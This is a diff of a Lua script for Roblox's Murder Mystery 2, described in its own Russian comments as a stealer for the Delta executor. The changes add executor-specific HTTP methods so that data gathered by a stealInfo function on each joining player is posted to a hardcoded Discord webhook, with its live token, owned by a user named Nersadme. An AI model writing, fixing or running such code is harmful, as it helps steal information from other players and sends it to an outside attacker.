@@ -1,13 +1,12 @@
--- Простой стилак MM2 для Alpha (Nersadme)
--- 100% отправит инфу в Discord
+-- Стилак MM2 для Delta Executor
+-- Alpha (Nersadme)
 
 local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
 local alphaNick = "Nersadme"
 
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
 
--- Простая функция отправки
+-- Функция отправки через syn.request (работает в Delta)
 local function sendToDiscord(msg, fields)
     local data = {
         content = msg,
@@ -17,12 +16,27 @@ local function sendToDiscord(msg, fields)
         }}
     }
     
-    local success, err = pcall(function()
-        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
-    end)
-    
-    if not success then
-        warn("Ошибка отправки: " .. tostring(err))
+    -- Метод 1: syn.request (Delta)
+    if syn and syn.request then
+        syn.request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    -- Метод 2: request (альтернатива)
+    elseif request then
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    -- Метод 3: стандартный HttpService
+    else
+        pcall(function()
+            game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data))
+        end)
     end
 end
 
@@ -48,10 +62,10 @@ end
 -- Новые игроки
 Players.PlayerAdded:Connect(function(player)
     if player.Name ~= alphaNick then
-        wait(1)
+        task.wait(1)
         stealInfo(player)
     end
 end)
 
 -- Тестовое сообщение
-sendToDiscord("Скрипт запущен и работает, Alpha! ✅", {})
+sendToDiscord("Скрипт запущен в Delta, Alpha! ✅", {})
